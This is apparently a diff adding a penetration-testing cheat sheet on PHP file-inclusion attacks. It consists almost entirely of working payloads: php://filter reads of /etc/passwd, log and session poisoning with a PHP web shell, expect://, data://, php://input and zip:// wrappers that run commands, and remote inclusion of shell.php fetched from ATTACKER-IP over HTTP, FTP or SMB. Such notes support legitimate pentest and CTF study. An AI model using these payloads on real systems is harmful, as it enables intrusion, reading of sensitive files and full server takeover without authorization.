@@ -1,0 +1,83 @@
+==> Retrieve files
+
+-> Via filter & encoding:
+curl http://TARGET-IP:PORT/extension/index.php?parameter=php://filter/read=convert.base64-encode/resource=/etc/passwd
+curl http://TARGET-IP:PORT/extension/index.php?parameter=php://filter/read=string.rot13/resource=/etc/passwd
+
+------------------------------------------------------------------------------
+
+==> LFI to RCE (Log poisoning)
+
+1. Change the user agent in Burp to "<?php system($_GET['cmd']); ?>"
+2. After that, add "&cmd=id" to the request in Burp and replay it
+
+/var/log/nginx/access.log
+/var/log/apache2/access.log
+/var/log/sshd.log
+/var/log/mail
+/var/log/vsftpd.log
+OLDER SERVERS: /proc/self/environ (User-Agent)
+
+------------------------------------------------------------------------------
+
+==> RCE through PHPSESSID
+
+-> Location(s): /var/lib/php/sessions/ (Linux)
+                /var/lib/php/sessions/ (Windows)
+
+-> Session file: "sess_" + Value of the PHPSESSID cookie
+                eg.: sess_q71r9gdodja64i5e7mr5bign4o
+
+-> To test:
+1. URL + ?parameter=/var/lib/php/sessions/blahblahblah
+2. URL + ?parameter=/var/lib/php/sessions/sess_q71r9gdodja64i5e7mr5bign4o (check for "blahblahblah" in the session file)
+
+-> To get shell:
+URL + ?parameter=<?php system($_GET['cmd']); ?>
+then:
+URL + ?parameter=/var/lib/php/sessions/sess_q71r9gdodja64i5e7mr5bign4o&cmd=id
+
+------------------------------------------------------------------------------
+
+==> LFI/RCE through wrappers
+
+--> "Expect" wrapper (provides access to process'es stdio, stdout and stderr via PTY)
+
+URL + ?parameter=expect://id
+
+--> "Data" wrapper (used to include external data; "allow_url_include" must be enabled)
+
+1. base64 encode the payload (shell):
+echo '<?php system($_GET['cmd']); ?>' | base64 
+PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
+
+2. Form the URL:
+URL + ?parameter=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
+
+--> "Input" wrapper (include external input and execute code; "allow_url_include" must be enabled):
+
+curl -s -X POST --data "<?php system('id'); ?>" "http://TARGET-IP:PORT/index.php?parameter=php://input" | grep uid
+
+--> "Zip" wrapper (in combination with file uploads):
+
+1. echo '<?php system($_GET['cmd']); ?>' > exec.php
+2. zip malicious.zip exec.php
+3. URL + ?parameter=zip://malicious.zip%23exec.php&cmd=id (%23 = #)
+
+------------------------------------------------------------------------------
+
+==> RFI 
+-> Have to be enabled: allow_url_fopen   (enabled by default)
+                       allow_url_include (NOT enabled b default)
+
+1. echo '<?php system($_GET['cmd']); ?>' > shell.php
+2. start a (local) server (also works with "pyftpdlib"
+   URL + ?parameter=ftp://ATTACKER-IP:PORT/shell.php&cmd=id
+   URL + ?parameter=ftp://user:pass@ATTACKER-IP:PORT/shell.php&cmd=id (in case of need for authenication)
+
+3. URL + ?parameter=http://ATTACKER-IP:PORT/shell.php&cmd=id
+
+ON WINDOWS, the restrictions applied by "allow_url_include" can be bypassed with SMB.
+
+1. smbserver.py -smb2support share . [Impacket]
+2. ?parameter=\\ATTACKER-IP:PORT\share\shell.php&cmd=id
